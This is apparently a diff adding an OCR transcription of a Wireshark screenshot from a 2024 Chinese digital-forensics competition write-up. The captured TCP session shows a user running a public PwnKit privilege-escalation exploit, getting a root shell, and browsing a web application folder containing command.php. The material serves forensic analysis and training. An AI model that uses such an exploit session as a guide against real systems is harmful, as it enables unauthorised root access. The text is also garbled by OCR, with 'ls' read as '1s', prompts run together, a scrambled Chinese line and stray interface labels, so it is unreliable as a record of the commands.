@@ -1,0 +1,40 @@
+# OCR: 2d88d4863dfaf68cdc5ad3870fe10ca6.webp
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/2d88d4863dfaf68cdc5ad3870fe10ca6.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Wireshark·追踪TCP流(tcp.streameq184)tcpdump_tj.cap 1s
+b64payloadgen.sh
+exploit exploit.c LICENSE Makefile
+pwnkit64decoded.c README.md
+[ww@localhost Pwnkit-Exploit-main]s./exploit./exploit
+Current User before execute exploit hacker@victimSwhoami:ww
+Exploitwrittenby@luijait(@x6c75696a616974)
+[+] Enjoy your root if exploit was completed succesfully bash: no job control in this shell
+[root@localhostPwnkit-Exploit-main]#whoami
+whoami root
+[root@localhost Pwnkit-Exploit-main]#[root@localhost Pwnkit-Exploit-main]#[root@localhost PwnKit-Exploit-main]#[root@localhost Pwnkit-Exploit-main]#[root@localhost Pwnkit-Exploit-main]#[root@localhostPwnkit-Exploit-main]#[root@localhost Pwnkit-Exploit-main]#ls 1s
+b64payloadgen.sh
+exploit exploit.c
+GCONV_PATH=.
+LICENSE Makefile
+pwnkit64decoded.c
+README.md tmp
+[root@localhost Pwnkit-Exploit-main]# cd.. cd../
+[root@localhost application]#1s
+1s admin
+command.php common
+Leommonnhn
+分想14036,159套户满分想，30瞬务薪分组，60tums人点击选择
+整个对话（6428bytes）查找：
+ASCII
+Showdataas
+滤掉此流
+打印
+另存为..
+返回
+关闭
+口
+x
+流184 查找下一个(N
+帮助
